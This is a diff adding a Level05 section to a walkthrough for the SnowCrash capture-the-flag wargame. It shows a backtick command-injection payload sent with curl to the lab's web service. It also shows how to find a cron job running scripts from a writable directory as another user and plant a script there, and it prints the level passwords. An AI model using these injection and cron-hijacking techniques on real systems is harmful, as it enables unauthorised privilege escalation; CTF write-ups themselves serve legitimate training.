@@ -188,3 +188,32 @@ As the website run command, we can write the following command to get the flag. 
 level04@SnowCrash:~$ curl '192.168.1.30:4747/?x=`getflag`'
 ```
 After that we have to log with `level05` and give the password `ne2searoevaevoem4ov4ar8ap`.
+
+## Level05
+
+When we connect for the first time with the user `level05` we got this : 
+```bash
+level05@192.168.1.30's password:
+You have new mail.
+level05@SnowCrash:~$
+```
+To find the new mail you just have to check your env.
+```bash
+level05@SnowCrash:~$ env | grep MAIL
+MAIL=/var/mail/level05
+level05@SnowCrash:~$ ls -l $MAIL
+-rw-r--r--+ 1 root mail 58 Jan 25 22:34 /var/mail/level05
+level05@SnowCrash:~$ cat $MAIL
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+```
+
+After looking on internet we see that openarenaserver is a game taking configuration file.
+
+We just have to create a conf file and wait for execute.
+
+Let's create a file `/opt/openarenaserver/exploit`
+```vim
+/bin/getflag > /tmp/soluce/flag05
+```
+
+After that we have to log with `level06` and give the password `viuaaale9huek52boumoomioc`.
